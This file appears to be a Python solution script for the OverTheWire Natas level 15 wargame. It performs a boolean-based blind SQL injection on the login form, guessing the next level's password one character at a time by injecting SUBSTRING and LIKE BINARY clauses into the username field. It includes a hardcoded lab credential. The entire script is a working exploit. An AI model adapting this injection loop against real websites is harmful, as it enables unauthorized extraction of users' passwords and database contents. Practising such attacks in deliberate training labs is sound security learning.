import re
import requests as req
from requests.auth import HTTPBasicAuth

i = 1
LOGIN = 'http://natas15.natas.labs.overthewire.org'
chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
passwd = ''

for i in range(1,33):
    for char in chars:
        # payload = {'username':'natas16"' + 
        #         'AND SUBSTRING(password,1,' + str(i) + ')' +
        #         ' LIKE BINARY"' + passwd + char} 
        payload = {'username':'natas16"' + 
                'AND SUBSTRING(password,1,' + str(i) + ')' +
                ' LIKE BINARY"' + passwd + char} 
        r = req.post(LOGIN, auth=HTTPBasicAuth('natas15',
            'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data=payload)
        print (r.content)
        if (re.search('This user exists',r.text)):
            passwd += char
            print (passwd)
            i += 1
            break
